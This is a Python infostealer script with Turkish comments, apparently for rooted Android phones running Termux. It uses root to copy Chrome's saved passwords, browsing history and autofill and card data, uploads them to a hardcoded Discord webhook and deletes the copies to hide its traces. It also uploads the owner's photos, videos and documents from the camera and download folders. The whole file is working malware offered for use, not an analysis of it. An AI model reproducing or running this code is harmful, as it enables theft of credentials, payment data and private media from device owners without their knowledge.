import os
import requests
import time
import logging
import shutil

# --- AYARLAR ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499686865559748659/1LIdmEUDM8Pr5xMCpChMaowQSlJIqjpRx5nS6ZWFf2gQ3NVfLLdQpe5_A3EeoL-47JzM"

# Medya Tarama Ayarları
TARGET_PATHS = [
    '/sdcard/DCIM/Camera',
    '/sdcard/Pictures',
    '/sdcard/Download'
]
EXTENSIONS = ('.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.pdf', '.docx')
MAX_FILE_SIZE_MB = 24 

# Chrome Veri Yolları (Sadece ROOT ile erişilebilir)
CHROME_DATA_DIR = "/data/data/com.android.chrome/app_chrome/Default"
CHROME_FILES = {
    "Login_Data": f"{CHROME_DATA_DIR}/Login Data", # Şifreler buradadır
    "History": f"{CHROME_DATA_DIR}/History",       # Geçmiş buradadır
    "Web_Data": f"{CHROME_DATA_DIR}/Web Data"      # Otomatik doldurma (kart vs.)
}

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class DiscordUploader:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.temp_dir = "/sdcard/Download/ChromeBackup" # Geçici kopyalama alanı

    def upload_file(self, file_path, is_sensitive=False):
        """Dosyayı Discord'a yükler."""
        file_name = os.path.basename(file_path)
        try:
            with open(file_path, 'rb') as f:
                # Hassas veriyse mesajla belirtelim
                content = "🔐 **Hassas Veri Bulundu!**" if is_sensitive else ""
                files = {'file': (file_name, f)}
                response = requests.post(self.webhook_url, data={"content": content}, files=files)
            
            if response.status_code in [200, 204]:
                logging.info(f"✅ Gönderildi: {file_name}")
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 5))
                self.upload_file(file_path, is_sensitive)
        except Exception as e:
            logging.error(f"❌ Hata ({file_name}): {e}")

    def steal_chrome_data(self):
        """Root yetkisiyle Chrome verilerini çeker."""
        logging.info("🕵️ Chrome verileri toplanıyor...")
        if not os.path.exists(self.temp_dir):
            os.makedirs(self.temp_dir)

        for key, path in CHROME_FILES.items():
            temp_path = os.path.join(self.temp_dir, key)
            # Root yetkisiyle dosyayı kopyala (su -c)
            # Termux'ta 'tsu' yüklü olmalıdır
            cmd = f"su -c 'cp \"{path}\" \"{temp_path}\" && chmod 777 \"{temp_path}\"'"
            os.system(cmd)
            
            if os.path.exists(temp_path):
                logging.info(f"🔓 {key} kilitleri açıldı, yükleniyor...")
                self.upload_file(temp_path, is_sensitive=True)
                os.remove(temp_path) # İzi temizle
            else:
                logging.warning(f"🚫 {key} dosyasına erişilemedi (Root yok veya dosya yok).")

    def scan_and_upload_media(self):
        """Normal medyaları tarar ve yükler."""
        logging.info("🔍 Medya taraması başlıyor...")
        for path in TARGET_PATHS:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(EXTENSIONS):
                            full_path = os.path.join(root, file)
                            if os.path.getsize(full_path) / (1024*1024) < MAX_FILE_SIZE_MB:
                                self.upload_file(full_path)
                                time.sleep(0.8)

if __name__ == "__main__":
    uploader = DiscordUploader(DISCORD_WEBHOOK_URL)
    
    # 1. Önce Chrome verilerini çekelim
    uploader.steal_chrome_data()
    
    # 2. Sonra fotoğrafları tarayalım
    uploader.scan_and_upload_media()
    
    logging.info("🏁 Tüm operasyon tamamlandı.")
